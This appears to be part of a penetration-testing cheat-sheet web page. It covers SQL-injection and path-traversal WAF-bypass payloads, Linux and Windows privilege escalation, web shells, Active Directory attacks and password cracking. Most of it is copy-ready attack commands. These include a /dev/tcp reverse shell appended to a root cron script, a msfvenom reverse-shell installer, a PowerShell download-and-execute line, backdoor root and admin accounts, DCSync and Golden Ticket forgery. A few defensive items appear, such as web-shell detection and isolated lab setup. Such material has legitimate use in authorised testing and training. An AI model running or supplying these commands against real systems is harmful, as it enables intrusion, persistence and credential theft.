SQLi — WAF bypass with comments, whitespace, and encoding
' OR 1=1--
'/**/OR/**/1=1--
' OR 1=1%23
%27%20OR%201=1--        (URL encoded)
1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--  (time-based blind)copy
Path traversal — double encoding bypass
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//etc/passwdcopy
sqlmap — WAF bypass options
sqlmap -u "https://$TARGET/page?id=1" --tamper=randomcase,space2comment,between \
  --random-agent --delay=1 --batchcopy
23 Privilege Escalation — Linux
PrivescLinux
▶
Finding and exploiting misconfigurations to escalate from low-privilege shell to root.
📖 Privesc checklist: sudo rights → SUID binaries → writable /etc/passwd → cron jobs with world-writable scripts → writable systemd services → capabilities → NFS no_root_squash → kernel exploits. GTFOBins lists how to exploit specific binaries.
Sudo — what can this user run as root?
sudo -l
# If you see: (ALL) NOPASSWD: /usr/bin/vim
# Then: sudo vim -c ':!/bin/bash'  → root shell!copy
SUID / SGID binaries (check GTFOBins for each one found)
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
# Also check for world-writable files in system paths:
find /etc /usr /bin /sbin -writable 2>/dev/nullcopy
Capabilities — binaries with dangerous Linux capabilities
getcap -r / 2>/dev/null
# python3 with cap_setuid is root equivalent:
# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'copy
Cron job exploitation — writable script called by root cron
cat /etc/crontab && ls /etc/cron.*
# If root's cron runs /opt/backup.sh and you can write it:
echo 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' >> /opt/backup.shcopy
Check for writable /etc/passwd (legacy systems)
ls -la /etc/passwd
# If writable, add a root user:
echo 'hacker:$(openssl passwd -1 hacker123):0:0:root:/root:/bin/bash' >> /etc/passwdcopy
Kernel exploit — check version against known exploits
uname -a
cat /etc/os-release
# Search searchsploit for kernel version:
searchsploit "linux kernel $(uname -r | cut -d'-' -f1)"copy
24 WebShell One-Liners
WebShell
▶
Minimal command-execution payloads. Defensive education — know what to look for in code reviews and WAF rules.
PHP web shell
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['c']); ?>
<?php echo shell_exec($_POST['x']); ?>copy
ASP/ASPX shell
<% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll) %>copy
JSP shell
<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>copy
Detect web shells in a directory (defensive)
grep -rn "system\|passthru\|shell_exec\|exec\|popen\|proc_open" /var/www/html/ \
  --include="*.php" -l
find /var/www/ -name "*.php" -newer /etc/passwd 2>/dev/nullcopy
25 Safe PoC Testing & Logging
SafetyLogging
▶
Reproducible, safe testing environments and comprehensive engagement logging best practices.
Record entire terminal session with timestamps
script -t 2> timing.log -a output.log
# Replay: scriptreplay timing.log output.logcopy
Isolated Docker container — no network, no host FS access
docker run --rm --network none --cap-drop ALL \
  -v $(pwd)/poc:/poc:ro \
  -it ubuntu:22.04 bashcopy
Spin up vulnerable lab target (DVWA)
docker run --rm -d -p 8080:80 --name dvwa vulnerables/web-dvwa
# Access: http://localhost:8080 — admin/passwordcopy
Log all commands with timestamps
(date; tool --version 2>&1; tool [args]) 2>&1 | tee -a "engagement-$(date +%Y%m%d).log"copy
Backup findings before ending session
tar -czf "findings-$(date +%Y%m%d-%H%M).tar.gz" *.txt *.json *.xml *.log
sha256sum findings-*.tar.gz > checksums.txtcopy
26 Privilege Escalation — Windows
PrivescWindows
▶
Windows-specific privilege escalation paths: service misconfigs, token impersonation, and UAC bypass.
📖 Windows privesc order: Check whoami /priv for dangerous tokens (SeImpersonatePrivilege → Potato attacks), then misconfigurations in services, then unquoted service paths, then AlwaysInstallElevated, then kernel exploits. LOLBAS for living-off-the-land techniques.
Initial enumeration — who am I and what tokens do I have?
whoami /all
net user %username%
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix"copy
Check for AlwaysInstallElevated (MSI installer privesc)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both are 1, create a malicious MSI:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f msi -o privesc.msi
msiexec /quiet /qn /i C:\Temp\privesc.msicopy
Service misconfigurations (PowerUp — part of PowerSploit)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5:8080/PowerUp.ps1'); Invoke-AllChecks"copy
Unquoted service path exploitation
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
# If: C:\Program Files\Vuln Service\service.exe
# Try placing payload at: C:\Program.exe or C:\Program Files\Vuln.execopy
Token impersonation — Potato attacks (SeImpersonatePrivilege)
# GodPotato (works on Windows Server 2012-2022):
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"copy
Pass-the-Hash — authenticate with NTLM hash (no password needed)
pth-winexe -U domain/admin%aad3b435b51404eeaad3b435b51404ee:NTLM-HASH //192.168.1.10 cmd.exe
impacket-psexec domain/admin@192.168.1.10 -hashes :NTLM-HASHcopy
27 Active Directory Attack Techniques
ADKerberos
▶
Advanced Active Directory attacks beyond basic enumeration — DCSync, Golden Ticket, ACL abuse.
📖 AD attack path: Foothold → enumerate with BloodHound → find path to Domain Admin → Kerberoast/AS-REP Roast → lateral movement → DCSync for all hashes → Golden Ticket for persistence. Use BloodHound's "Shortest Paths to Domain Admin" query to find your path.
DCSync attack — dump all domain hashes (requires Domain Admin or special ACLs)
secretsdump.py -just-dc domain/DA-user:Pass123@192.168.1.10
# Or from a Meterpreter session:
meterpreter > run post/windows/gather/credentials/domain_hashdumpcopy
Pass-the-Ticket — use a stolen Kerberos ticket
# Export tickets with mimikatz:
sekurlsa::tickets /export
# Inject ticket (impacket):
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass domain/user@192.168.1.10copy
Golden Ticket — forge a TGT with the KRBTGT hash (ultimate persistence)
# Get KRBTGT hash first via DCSync, then:
ticketer.py -nthash KRBTGT-HASH -domain-sid S-1-5-21-xxx \
  -domain domain.local fake-admin
export KRB5CCNAME=fake-admin.ccache
wmiexec.py -k -no-pass domain.local/fake-admin@192.168.1.10copy
ACL abuse — WriteDACL / GenericAll privilege escalation
# Add yourself to a group using GenericAll on that group:
net rpc group addmem "Domain Admins" "your-user" -U domain/your-user%password -S 192.168.1.10
# Or with PowerView:
Add-DomainGroupMember -Identity "Domain Admins" -Members "your-user" -Credential $credcopy
ADCS (Active Directory Certificate Services) attacks — ESC1
# Enumerate vulnerable certificate templates:
certipy find -u user@domain.local -p 'Pass123' -dc-ip 192.168.1.10 -vulnerable
# Request certificate for DA (ESC1):
certipy req -u user@domain.local -p 'Pass123' -ca "Domain-CA" \
  -template VulnTemplate -upn administrator@domain.localcopy
28 Password Cracking Deep Dive
HashcatJtR
▶
Advanced cracking strategies with hashcat rules, mask attacks, and John the Ripper for varied hash types.
📖 Cracking strategy order: (1) Straight attack with rockyou.txt, (2) rockyou + best64.rule, (3) Mask attack (patterns like ?u?l?l?l?d?d for Abc12), (4) Combinator (two wordlists merged), (5) Prince attack, (6) Custom rules based on company name/year patterns. Always start with the fastest and work up.
Hashcat — benchmark your GPU before starting
hashcat -b -m 1000  # Benchmark NTLM speedcopy
Hashcat — attack modes
# -a 0: Wordlist (straight)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
# -a 1: Combinator (word1 + word2)
hashcat -m 1000 -a 1 hashes.txt words1.txt words2.txt
# -a 3: Mask (brute-force with pattern)
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?d?d?d?s
# -a 6: Wordlist + Mask (word + suffix)
hashcat -m 1000 -a 6 hashes.txt words.txt ?d?d?d?dcopy
Hashcat — custom rule for company-based passwords
# Create a rule file (company.rule):
echo ':' > company.rule       # base word
echo '$2024' >> company.rule  # append year
echo 'c' >> company.rule      # capitalize first
hashcat -m 1000 -a 0 hashes.txt company-words.txt -r company.rulecopy
John the Ripper — versatile, good for unusual formats
# Auto-detect hash type:
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Crack /etc/shadow:
unshadow /etc/passwd /etc/shadow > combined.txt && john combined.txt
# Show cracked passwords:
john --show hashes.txtcopy
CeWL — generate wordlist from target website (company-specific words)
cewl https://$TARGET -d 3 -m 6 -w cewl-wordlist.txt
# Combine with hashcat rules:
hashcat -m 1000 -a 0 hashes.txt cewl-wordlist.txt -r /usr/share/hashcat/rules/best64.rulecopy
